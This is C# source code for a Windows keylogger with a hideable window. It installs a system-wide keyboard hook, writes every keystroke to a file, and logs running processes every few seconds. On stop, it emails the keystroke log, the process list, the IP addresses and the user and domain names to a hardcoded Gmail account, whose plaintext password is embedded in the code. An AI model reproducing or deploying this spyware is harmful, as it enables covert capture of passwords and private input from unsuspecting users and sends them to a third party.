using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Runtime.InteropServices;
using Hooks;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Net;
using System.Net.Mail;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool ShowWindow(IntPtr hWnd, int showCmds);

        List<Keys> _pressedKeys;

        public Form1()
        {

            InitializeComponent();
        }

        string filename = "Keylogger.txt";
        bool WriteToFile = true;
        int seconds = 0;
        System.IO.StreamWriter writer;

        private void btnSaveFile_Click(object sender, EventArgs e)
        {
            SaveFileDialog.FileName = "Keylogger.txt";
            SaveFileDialog.InitialDirectory = Environment.CurrentDirectory;
            if (SaveFileDialog.ShowDialog() != DialogResult.Cancel)
            {
                filename = SaveFileDialog.FileName;
                lblFilename.Text = filename;
                lblFilename.ForeColor = Color.Black;
                System.IO.File.Create(filename).Close();
                lblError.Visible = false;
            }
        }

        private async void btnStart_Click(object sender, EventArgs e)
        {
            if (rbToFile.Checked)
            {
                if (lblFilename.Text != "YourFileName")
                {
                    if (chbBack.Checked) ShowWindow(this.Handle, 0);
                    WriteToFile = true;
                    lblError.Visible = false;          
                }
                else lblError.Visible = true;
            }
            else
            {
                WriteToFile = false;
            }

            if (lblError.Visible == false)
            {
                _pressedKeys = new List<Keys>();

                Hooks.KBDHook.KeyDown += new Hooks.KBDHook.HookKeyPress(KBDHook_KeyDown);
                Hooks.KBDHook.KeyUp += new Hooks.KBDHook.HookKeyPress(KBDHook_KeyUp);
                Hooks.KBDHook.LocalHook = false; // во всей системе 
                Hooks.KBDHook.InstallHook();

                lblEnabled.Text = "Enable";
                lblEnabled.ForeColor = Color.Green;
                
                btnStart.Visible = false;
                btnStop.Visible = true;

                timer.Enabled = true;
                lblTime.Text = "00:00:00";
                lblTime.Visible = true;
                seconds = 0;
                await Task.Run(() =>
                {
                    if (!File.Exists("Processes.txt"))
                    {
                        FileStream fs = File.Create("Processes.txt");
                        fs.Close();
                    }
                    do
                    {
                        foreach (Process process in Process.GetProcesses())
                        {
                            var processes = File.ReadAllText("Processes.txt");
                            if (!processes.Contains(process.ProcessName))
                            {
                                StreamWriter processWriter = File.AppendText("Processes.txt");
                                processWriter.WriteLine($"ID: {process.Id}  Name: {process.ProcessName}");
                                processWriter.Close();
                            }
                        }
                        Thread.Sleep(3000);
                    } while (true);
                    try
                    {
                        

                    }
                    catch (Exception)
                    {

                    }

                });
            }
        }
        
        private void Stop()
        {
            lblEnabled.Text = "Disable";
            lblEnabled.ForeColor = Color.Fuchsia;
            if (KBDHook.IsHookInstalled)
                KBDHook.UnInstallHook();
            btnStart.Visible = true;
            btnStop.Visible = false;
            timer.Enabled = false;
            
            SendNewMessage(filename);

        }

        void KBDHook_KeyUp(Hooks.LLKHEventArgs e)
        {
            _pressedKeys.Remove(e.Keys);
        }

        string text = "";

        void KBDHook_KeyDown(Hooks.LLKHEventArgs e)
        {
            if (!_pressedKeys.Contains(e.Keys))
            {
                _pressedKeys.Add(e.Keys);
                if (_pressedKeys.Count > 1) text = "+" + e.Keys.ToString();
                else text = " " + e.Keys.ToString();
                if (WriteToFile)
                {
                    writer = System.IO.File.AppendText(filename);
                    writer.Write(text);
                    writer.Close();
                }
                else tbGrab.Text += text;
                
            }
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            lblTime.Text = (seconds / 3600 / 10).ToString() + (seconds / 3600 % 10).ToString() + ":" + (seconds / 60 % 3600 / 10).ToString() + (seconds / 60 % 3600 % 10).ToString() + ":" + (seconds % 60 / 10).ToString() + (seconds % 60 % 10).ToString();
            seconds++;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Stop();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            Stop();
        }

        static void SendNewMessage(string path) 
        {
            //String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filepath = /*folderName+*/ "Processes.txt";
            String logContents = File.ReadAllText(filepath);
            String logContentsKeyLogger = File.ReadAllText(path);
            string emailBody = "";
            
            DateTime now = DateTime.Now;
            string subject = "Message from key logger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address:" + address;
            }

            emailBody += "\n User" + Environment.UserDomainName + "\\" + Environment.UserName;
            emailBody += "\nhost" + host;
            emailBody += "\n time" + now.ToString();
            emailBody += logContents;
            emailBody += "**********";
            emailBody += "\n";
            emailBody += logContentsKeyLogger;


            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();
            mailMessage.From = new MailAddress("testspyboond@gmail.com");
            mailMessage.To.Add("testspyboond@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("testspyboond@gmail.com", "123qweewq321");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }
    }
}
